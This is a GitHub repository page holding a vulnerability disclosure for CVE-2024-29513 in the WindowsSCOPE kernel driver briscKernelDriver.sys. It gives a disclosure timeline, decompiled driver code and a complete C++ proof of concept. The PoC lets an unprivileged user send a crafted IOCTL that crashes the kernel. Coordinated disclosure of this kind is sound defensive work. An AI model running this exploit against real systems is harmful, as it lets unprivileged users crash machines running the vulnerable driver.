
[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdru1d-foofus%2FbriscKernelDriver)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fdru1d-foofus%2FbriscKernelDriver)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E&source=header-repo&source_repo=dru1d-foofus%2FbriscKernelDriver)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[dru1d-foofus](/dru1d-foofus)
/
**[briscKernelDriver](/dru1d-foofus/briscKernelDriver)**
Public

* [Notifications](/login?return_to=%2Fdru1d-foofus%2FbriscKernelDriver) You must be signed in to change notification settings
* [Fork
  0](/login?return_to=%2Fdru1d-foofus%2FbriscKernelDriver)
* [Star
   0](/login?return_to=%2Fdru1d-foofus%2FbriscKernelDriver)

Public disclosure of vulnerabilities identified in WindowsSCOPE kernel driver

[0
stars](/dru1d-foofus/briscKernelDriver/stargazers) [0
forks](/dru1d-foofus/briscKernelDriver/forks) [Branches](/dru1d-foofus/briscKernelDriver/branches) [Tags](/dru1d-foofus/briscKernelDriver/tags) [Activity](/dru1d-foofus/briscKernelDriver/activity)
 [Star](/login?return_to=%2Fdru1d-foofus%2FbriscKernelDriver)

 [Notifications](/login?return_to=%2Fdru1d-foofus%2FbriscKernelDriver) You must be signed in to change notification settings

* [Code](/dru1d-foofus/briscKernelDriver)
* [Issues
  0](/dru1d-foofus/briscKernelDriver/issues)
* [Pull requests
  0](/dru1d-foofus/briscKernelDriver/pulls)
* [Actions](/dru1d-foofus/briscKernelDriver/actions)
* [Projects
  0](/dru1d-foofus/briscKernelDriver/projects)
* [Security](/dru1d-foofus/briscKernelDriver/security)
* [Insights](/dru1d-foofus/briscKernelDriver/pulse)

Additional navigation options

* [Code](/dru1d-foofus/briscKernelDriver)
* [Issues](/dru1d-foofus/briscKernelDriver/issues)
* [Pull requests](/dru1d-foofus/briscKernelDriver/pulls)
* [Actions](/dru1d-foofus/briscKernelDriver/actions)
* [Projects](/dru1d-foofus/briscKernelDriver/projects)
* [Security](/dru1d-foofus/briscKernelDriver/security)
* [Insights](/dru1d-foofus/briscKernelDriver/pulse)

# dru1d-foofus/briscKernelDriver

    main[Branches](/dru1d-foofus/briscKernelDriver/branches)[Tags](/dru1d-foofus/briscKernelDriver/tags)Go to fileCode
## Folders and files

| Name | | Name | Last commit message | Last commit date |
| --- | --- | --- | --- | --- |
| Latest commit History[4 Commits](/dru1d-foofus/briscKernelDriver/commits/main/) | | |
| [images](/dru1d-foofus/briscKernelDriver/tree/main/images "images") | | [images](/dru1d-foofus/briscKernelDriver/tree/main/images "images") |  |  |
| [README.md](/dru1d-foofus/briscKernelDriver/blob/main/README.md "README.md") | | [README.md](/dru1d-foofus/briscKernelDriver/blob/main/README.md "README.md") |  |  |
| [briscKernelDriver.sys](/dru1d-foofus/briscKernelDriver/blob/main/briscKernelDriver.sys "briscKernelDriver.sys") | | [briscKernelDriver.sys](/dru1d-foofus/briscKernelDriver/blob/main/briscKernelDriver.sys "briscKernelDriver.sys") |  |  |
| View all files | | |

## Repository files navigation

* README
# CVE-2024-29513 - briscKernelDriver.sys

## Overview

Vendor : BlueRiSC

Website : <https://www.windowsscope.com/>

Product : briscKernelDriver.sys

Affected Version(s) : < 3.3

"WindowsSCOPE Cyber Forensics 3.2 is a GUI-based memory forensic capture and analysis toolkit. It supports the import of standard raw physical memory dumps which are then automatically reverse engineered and presented in an easy-to-view format for forensic analysis in a central location. It automatically identifies all processes, threads, and drivers running on the system as well as other system activity including open files, registry keys, and network sockets. It supports the latest Windows versions through Windows 10 and also has advanced data search capabilities to find URLs, credit cards, names, etc. in captured memory. Applications include digital forensics, crime investigation, cyber defense & attack detection, and other reverse engineering activities."

While reviewing the briscKernelDriver.sys, several security issues were discovered. These issues include:

* Overly permissive access control to, `\\.\BriscKernel`, the device object created by the briscKernelDriver.sys driver.
* Expired code signing certificate for the briscKernelDriver.sys driver.
* Ability to leverage the briscKernelDriver.sys to perform memory operations in the context of an unprivileged user.
* Ability to trigger a denial-of-service condition (kernel bugcheck) if incorrect data was passed to the briscKernelDriver.sys in the context of an unprivileged user.

## Disclosure Timeline

* **02/13/2024** - Initial disclosure to BlueRiSC and notified of intent to publicly disclose security issues within 90-days.
* **02/14/2024** - Acknowledgement from BlueRiSC. Provided clarifying information about device object permissions and provided a method for them to confirm the ACL issues were addressed.
* **03/04/2024** - WindowsSCOPE website now displays version 3.3 indicating a silent patch without disclosure. Additional email to BlueRiSC was sent asking for clarification about this patch and advised that if these issues have been remediated, then we will move forward with an earlier public disclosure.
* **03/05/2024** - BlueRiSC stated that version 3.3 contains the fix for the driver permission issue. A copy of the updated driver was requested to confirm everything was fixed.
* **03/06/2024** - BlueRiSC agreed to have the version 3.3 kernel driver tested to confirm permissions issue was fixed.
* **03/15/2024** - Version 3.3 kernel driver was tested and ACL fix was confirmed.
* **03/15/2024** - Public disclosure.

## Expired Driver Signing Certificate

WindowsSCOPE Cyber Forensics 3.2 ships with a version of briscKernelDriver.sys (built January 23, 2019) that has an expired signing certifiate.

[![Expired Signing Certificate](/dru1d-foofus/briscKernelDriver/raw/main/images/expired-certificate.png)](/dru1d-foofus/briscKernelDriver/blob/main/images/expired-certificate.png)

A user of the WindowsSCOPE product would need to disable driver signature enforcement to use the provided driver.

## Overly Permissive Device Object ACL

The briscKernelDriver.sys driver creates a device object that allows the Everyone built-in group to write to the device. This is because `IoCreateDevice` was used instead of `WdmlibIoCreateDeviceSecure`\`IoCreateDeviceSecure`.

[![Device Object Permissions](/dru1d-foofus/briscKernelDriver/raw/main/images/device-object-permissions.png)](/dru1d-foofus/briscKernelDriver/blob/main/images/device-object-permissions.png)

```
NTSTATUS DriverEntry(DRIVER_OBJECT* DriverObject)

    DbgPrint(Format: "BlueRISC Kernel Driver\n")
    DbgPrint(Format: "Built %s %s\n", "Jan 23 2019", "09:55:52")
    DriverObject->MajorFunction[0] = IRP_MJ_CreateClose
    DriverObject->MajorFunction[2] = IRP_MJ_CreateClose
    DriverObject->DriverUnload = sub_19314
    DriverObject->MajorFunction[0xe] = IRP_MJ_DEVICE_CONTROL
    void DeviceName
    RtlInitUnicodeString(DestinationString: &DeviceName, SourceString: u"\Device\BriscKernel")
    NTSTATUS rax = IoCreateDevice(DriverObject, DeviceExtensionSize: 0, DeviceName: &DeviceName, DeviceType: 0x22, DeviceCharacteristics: 0, Exclusive: 0, DeviceObject: &DeviceObject)
    if (rax s>= STATUS_SUCCESS)
        void SymlinkName
        RtlInitUnicodeString(DestinationString: &SymlinkName, SourceString: u"\DosDevices\BRISCKERNEL")
        NTSTATUS rax_1 = IoCreateSymbolicLink(SymbolicLinkName: &SymlinkName, DeviceName: &DeviceName)
        if (rax_1 s>= STATUS_SUCCESS)
            DEVICE_OBJECT* DeviceObject_1 = DeviceObject
            DeviceObject_1->Flags = DeviceObject_1->Flags | DO_BUFFERED_IO
            rax = STATUS_SUCCESS
        else
            IoDeleteDevice(DeviceObject)
            rax = rax_1
    return rax
```

## Denial of Service Proof-of-Concept

It is possible from an unprivileged context to interact with the driver and create a denial of service condition. This is possible by sending unexpected data to the `0x222028` IOCTL.

```
if (IOCTL == 0x222028)
    HANDLE Handle = *PIRP->AssociatedIrp
    DbgPrint(Format: "processHandle = 0x%x\n", Handle)
    rax_13 = ObReferenceObjectByHandle(Handle, DesiredAccess: 0x418, ObjectType: *PsProcessType, AccessMode: PIRP->RequestorMode, Object: &arg_10, HandleInformation: nullptr)
    rbx = rax_13
    if (rax_13 s>= STATUS_SUCCESS)
        void ApcState
        KeStackAttachProcess(PROCESS: arg_10, ApcState: &ApcState)
        *nullptr = 0
        PIRP->IoStatus.Information = 0
    else
        DbgPrint(Format: "ObReferenceObjectByHandle failed")
```

[![Kernel Bug Check](/dru1d-foofus/briscKernelDriver/raw/main/images/bugcheck.png)](/dru1d-foofus/briscKernelDriver/blob/main/images/bugcheck.png)

```
#include <windows.h>
#include <iostream>
#include <DbgHelp.h>
#include <TlHelp32.h>

#pragma comment(lib, "Dbghelp.lib")

#define IOCTL_GetVirtMem 0x222020
#define IOCTL_TriggerBugCheck 0x222028

static const char* DeviceName = R"(\\.\BriscKernel)";

typedef struct _BRISC_READ_MEMORY {
    HANDLE pHandle;
} BRISC_READ_MEMORY, * PBRISC_READ_MEMORY;

DWORD GetProcessIdByName(const std::wstring& processName) {
    HANDLE hSnapShot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pEntry;
    pEntry.dwSize = sizeof(pEntry);

    BOOL hRes = Process32First(hSnapShot, &pEntry);
    while (hRes) {
        if (wcscmp(pEntry.szExeFile, processName.c_str()) == 0) {
            CloseHandle(hSnapShot);
            return pEntry.th32ProcessID;
        }
        hRes = Process32Next(hSnapShot, &pEntry);
    }

    CloseHandle(hSnapShot);
    return 0;
}

std::wstring StringToWString(const std::string& s) {
    int len;
    int slength = (int)s.length() + 1;
    len = MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, 0, 0);
    wchar_t* buf = new wchar_t[len];
    MultiByteToWideChar(CP_ACP, 0, s.c_str(), slength, buf, len);
    std::wstring r(buf);
    delete[] buf;
    return r;
}

constexpr DWORD cexpr_lstrlenW(const wchar_t str[]) {
    DWORD i = 0;
    while (str[i++]) {}
    return i;
}

void DumpVirtualMemory(const std::wstring& processName) {
    DWORD pid = GetProcessIdByName(processName);
    if (pid == 0) {
        std::wcout << L"Process not found.\n";
        return;
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        std::wcout << L"Failed to open process.\n";
        return;
    }

    HANDLE hDevice = CreateFileA(DeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        std::wcout << L"Failed to open device.\n";
        CloseHandle(hProcess);
        return;
    }

    BRISC_READ_MEMORY readMemory;
    readMemory.pHandle = hProcess;
    BYTE outBuffer[0x1004] = { 0 };
    DWORD dwBytesReturned;

    BOOL bResult = DeviceIoControl(hDevice, IOCTL_TriggerBugCheck, &readMemory, 0x18, outBuffer, 0x1004, &dwBytesReturned, NULL);
    if (!bResult) {
        std::wcout << L"DeviceIoControl failed with error: " << GetLastError() << L"\n";
    }
    else {
        std::wcout << L"You won't even see this because we bugchecked the system.\n";
        std::wcout << L"Memory dumped successfully.\n";

        std::wstring filePath = L"dumped_memory.bin";
        HANDLE hFile = CreateFileW(filePath.c_str(), GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        if (hFile != INVALID_HANDLE_VALUE) {
            DWORD written;
            BOOL writeResult = WriteFile(hFile, outBuffer, dwBytesReturned, &written, NULL);
            if (!writeResult || written != dwBytesReturned) {
                std::wcout << L"Failed to write memory dump to file.\n";
            }
            else {
                std::wcout << L"Memory dump successfully written to " << filePath << L"\n";
            }
            CloseHandle(hFile);
        }
        else {
            std::wcout << L"Failed to open file for writing.\n";
        }
    }

    CloseHandle(hDevice);
    CloseHandle(hProcess);
}

int main() {
    DumpVirtualMemory(L"PoC.exe");
}
```

## About

Public disclosure of vulnerabilities identified in WindowsSCOPE kernel driver

### Resources

[Readme](#readme-ov-file)

[Activity](/dru1d-foofus/briscKernelDriver/activity)
### Stars

[**0**
stars](/dru1d-foofus/briscKernelDriver/stargazers)
### Watchers

[**1**
watching](/dru1d-foofus/briscKernelDriver/watchers)
### Forks

[**0**
forks](/dru1d-foofus/briscKernelDriver/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fdru1d-foofus%2FbriscKernelDriver&report=dru1d-foofus+%28user%29)

## [Releases](/dru1d-foofus/briscKernelDriver/releases)

No releases published

## [Packages 0](/users/dru1d-foofus/packages?repo_name=briscKernelDriver)

No packages published

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.

